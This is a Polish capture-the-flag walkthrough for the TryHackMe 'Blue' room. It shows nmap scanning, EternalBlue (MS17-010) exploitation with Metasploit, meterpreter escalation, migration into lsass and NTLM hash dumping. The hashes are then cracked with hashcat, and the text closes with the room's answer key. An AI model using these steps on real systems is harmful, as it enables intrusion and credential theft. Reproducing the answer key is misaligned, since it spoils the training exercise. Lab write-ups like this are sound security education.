1. Na początku musimy klasycznie połączyć się z VPN za pomocą OpenVPN.
Wchodzimy na nasz [profil](https://tryhackme.com/access) pobieramy plik do połączanienia wchodzimy w "/Downloads" i wpisujemy w nowym
terminalu:

``` $ openvpn <Nazwa>.ovpn ```


2. Po tym otwieramy zadanie nr. 1 i odpalamy instancję ( Deploy ).

3. Po tym wszystkim możemy powoli zaczynać. Pierwsze co robimy to skanujemy maszyne:

``` $ nmap -Pn <Adress Ip> ```

Skanowanie pokazuje nam usługi i porty, na których dzialają. Spróbujmy dowiedzieć się o dystrybucji.

```$ nmap -A -T 5 <Adress Ip> -vv```

Widzimy, że maszyna jest postawiona na Windows 7.

4. Teraz musimy się dowiedzieć na co jest podatna maszyna ( ms??-??? ). Więc wpisujemy:

```$ nmap --script vuln <Adress Ip> -vv```

I widzimy smb-vuln-ms17-010 ( [ms17-010](https://www.exploit-db.com/exploits/42315) ).

5. Teraz spróbujmy uzyskać dostęp na maszynie.

6. Odpalamy [Metasploit](https://www.metasploit.com/):

```$ msfconsole```

Szukamy exploit'a na tę podatność w msf:

```$ search ms17–010```

Pokazuje nam się lista dostępnych ataków. My z racji, że znamy dystrybucję wybieramy tego na Windows 7.

``` $ use 2 ``` (windows/smb/ms17_010_eternalblue)

7. Musimy się dowiedzieć jakie opcje musimy uzupełnić do ataku:

```$ show options```

Widzimy RHOST, więc go uzupełniamy:

```$ set RHOSTS <Adress Ip>```

I uruchamiamy skrypt:

```$ run```

Powinniśmy uzyskać dostęp do konsoli!

W razie czego upewnij się że exploit dziąła poprawnie. Kliknij enter i powinneś widzieć shella DOS.
Spróbuj wejść w tło shell'a (CTRL + Z). Jeżeli to się nie uda może być konieczne ponowne uruchomienie maszyny (deploy), lecz przed tym spróbuj znów uruchomić skrypt i zobaczyć czy działa.

Nacisnij enter.

8. Jeżeli jeszcze nie wszedłeś do tła shella (CTRL + Z). Dowiedz się w internecie jak
przekonwertować shell'a na meterpretera w metasploit. Jaka jest nazwa modułu post, którego użyjemy.
( Dokładna ścieżka, podobna do nazwy użytego exploita )

9. Wrócmy najpierw do metasploita:

```$ background```

Zweryfikujmy czy sesja nadal istnieje:

```$ session```

Powinna nam się pokazać informacja o sesji jej typie itp.

10. Spróbujmy zmienić shella na meterpretera:

```$ use multi/manage/shell_to_meterpreter```

Uzupełnij wszystkie brakujące opcje aby przechwycić shell'a:

```
$ set LPORT 1234
$ set SESSION 1
```

Uruchom:

```$ run```

Jeżeli to nie działa spróbuj znów zrobić shell'a.

11. Zobaczmy istniejące sesje:

```$ session```

Powinniśmy zobaczyć drugą sesje, która ma w typie meterpreter.

Spróbujmy do niej się podłączyć:

```$ sessions 2```

Powinniśmy widzieć konsole meterpretera.

12. Sprawdźmy czy eskalowaliśmy do NT AUTHORITY\SYSTEM. Uruchom te polecenie w tym celu:

```$ getsystem```

Możemy swobodnie zmieniać powłoki z shell do meterpretera.

Sprawdźmy kim jesteśmy:

```
$ shell
$ whoami
```

Wróćmy do meterpretera ( CTRL + Z ).

13. To że jesteśmy systemem nie oznacza, że nasz proces też nim jest. Sprawdźmy liste działająch procesów:

```$ ps```

I zapamiętajmy id procesu (PID).

14. Zmigrujmy sobie proces lsass.exe. Mając meterpretera wpiszmy:

```$ migrate 708```

15. Zrzućmy (dump) hasła nie podstawowych użytkowników do późniejszego ich złamania.

W naszym podwyższonym shell'u (meterpreter) uruchomy polecenie:

```$ hashdump```

Spowoduje to dumpowanie wszystkich hashy haseł na komputerze jeżeli mamy do tego odpowiednie uprawnienia.

Który użytkownik nie jest defaultowy?

16. Skopiuj hashe do pliku do złamania. ( to hashe [NTLM](https://en.wikipedia.org/wiki/NT_LAN_Manager)  wklej je tak jak widzisz w konsoli ).

Zorganizujmy hash do łamania. (user:hash <-- ostatni "zlepek liter" w lini po : i przed ::: )

np.
```Administrator:31d6cfe0d16(...)```

17. Ja użyje hashcat'a do złamania hashy.

``` $ hashcat -a 0 -m 1000 <NazwaPlikuZHashami>.txt <SłownikDoŁamania np. rockyou.txt>.txt --force --username --show ```

Po chwili powinniśmy uzyskać hasło do Jon'a (alqfna22)

18. Teraz poszukajmy flag:

1) Pierwsza znajduje się w lokacji C:\flag1.txt

2) Następna w C:\Documents and Settings\Jon\Documents\flag3.txt

3) A ostatnia w C:\Windows\System32\config\flag2.txt

Każdą flagę można pokazać za pomocą ```type```
np. ``` type flag1.txt ```

19. To powinno być na tyle. Powodzenia!

// Uzupełnienie rubryk.

Zadanie 1.

2) 3

3) ms17-010

Zadanie 2.

2) exploit/windows/smb/ms17_010_eternalblue

3) RHOSTS

Zadanie 3.

1) post/multi/manage/shell_to_meterpreter

2) SESSION

Zadanie 4.

1) Jon

2) alqfna22

Zadanie 5.

1) Wpisz flage numer 1

2) Wpisz flage numer 2

3) Wpisz flage numer 3 
